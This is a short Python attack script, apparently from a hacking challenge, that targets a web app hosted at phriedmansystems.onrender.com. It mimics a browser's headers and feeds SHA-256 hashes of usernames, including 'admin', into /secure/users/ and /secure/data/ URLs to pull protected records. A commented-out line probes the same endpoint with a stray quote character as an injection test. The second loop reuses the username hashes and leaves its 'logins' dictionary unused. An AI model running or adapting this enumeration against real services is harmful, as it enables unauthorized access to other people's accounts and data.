import requests

headers = {
    'authority': 'phriedmansystems.onrender.com',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
    'sec-ch-ua-mobile': '?0',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
    'accept': '*/*',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://phriedmansystems.onrender.com/login.html',
    'accept-language': 'en-US,en;q=0.9',
    'if-none-match': '"76b5ff537989423e137dac5abb7f2740"',
    'if-modified-since': 'Wed, 28 Apr 2021 03:59:17 UTC',
}

hashes = {
    'admin': '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',
'csmith': '21e617891b637d6d099b02e140bad839bcc43f6a2e2149b4c2358ac52966edca',
'mruppsen': 'c32893d1f88eb61f70526646c10aa7b4232f31f37d197f60664d6a879bd6ca65',
'vfrudd': '770c2bcf8cbb643ad7f715fdbe8d3c1c465599edaff5fad184886e2753205f51',
'amartey': '7e7297b26bda821ba926e7aec14aae25595a2b05cfa4f2b31ae7f3f89698e913',
'lvedley': '0587dce01f5d83d3777587059802ea79c9e8b6ad47266d45cc7d022e8266576a',
'sleaver': 'ed48c0849b0815ccf85da6f4dfee03c3d66e24bb0f45ff9e41d741828875dffb',
'jriddley': '3cea8208b1f10a63d3c19a69847501fdf6e06a5036f967e63f211d37e37d1eed',
'rfiddson': 'c91934f837472af5b75cabd24c40ac2d50e904d2dfb1b497be4050e95c5a467b',
'peddlin': '95c8d990569ea20af012c889ca8d3725d445ce63dbe7baa1f5c8dbc905ef5d8f',
}

logins = {
    'csmith-': 'd1c9a535a05f56c70fdc15514499c0572c267ad34ad982f5f7ff89522a999282',
    'mruppsen-': '9eb8e73d49315ce6c1226d6bd51f9225b8496b973d70b95f08b3491c85a47755',
    'vfrudd-': 'cbd136bfd1bce4656cca5c6af5ff0338535f64debe6792a1c2f759008fe646e1',
    'amartey-': 'ac9b5d19fbad7eb5a8680ea6a80d7a0a4d47495d3514aee3cdfe819ac675e265',
    'lvedley-': '0906ea7362adfb8b0fa0648ffc87ab66e13e2c8a8bc06378ff5bdca5341cb430',
    'sleaver-': 'ed601643f47bacacc084b9813fa8de2382c92b04878bc1f837d9307cea760356',
    'jriddley-': '509a44c1e8b8f4a2011c7efa1c5c14e40186002cb494aeda86c7a8c8cb52c0f8',
    'rfiddson-': '9691296b4bac9d505478d8fe2568ba4b41303f95e3f6437b093a84c5c329e48d',
    'peddlin-': '3ad78b3e4173839a5c1bd8025c013c2562d644675d8dcadea7ef3a3bc42cb1dc',
    'aheddsen-': '8f8aae3ac34724cb590170ac17b1d3bdb5177b6735831a9a5661a591d13006f5',
}

# response = requests.get('https://phriedmansystems.onrender.com/secure/data/{}'.format('test"'), headers=headers)
# print('Status: {} - Result: {}'.format(response.status_code, response.text))

# quit()

print('Testing Users...')
for (k, h) in hashes.items():
    response = requests.get('https://phriedmansystems.onrender.com/secure/users/{}'.format(h), headers=headers)
    print('Testing: {}'.format(k))
    print('Status: {} - Result: {}'.format(response.status_code, response.text))

print('\n\nTesting Logins...')
for (k, h) in hashes.items():
    response = requests.get('https://phriedmansystems.onrender.com/secure/data/{}'.format(h), headers=headers)
    print('Testing: {}'.format(k))
    print('Status: {} - Result: {}'.format(response.status_code, response.text))
